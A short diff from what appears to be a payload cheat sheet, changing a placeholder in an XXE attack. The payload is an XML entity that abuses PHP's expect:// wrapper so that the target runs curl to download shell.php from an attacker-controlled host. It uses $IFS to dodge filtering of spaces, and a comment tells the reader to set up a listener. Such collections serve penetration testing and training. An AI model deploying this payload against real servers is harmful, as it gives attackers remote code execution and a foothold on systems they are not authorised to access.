@@ -10,7 +10,7 @@ XXE that abuses the `expect://` PHP wrapper to fetch and execute a remote shell.
 # Inject this into your request and call &company in the right field to execute the payload, remember to set your listener so the target can download your payload.
 <?xml version="1.0"?>
 <!DOCTYPE email [
-  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'$IP/shell.php'">
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'$lhost/shell.php'">
 ]>
 ```
 <!-- cheat
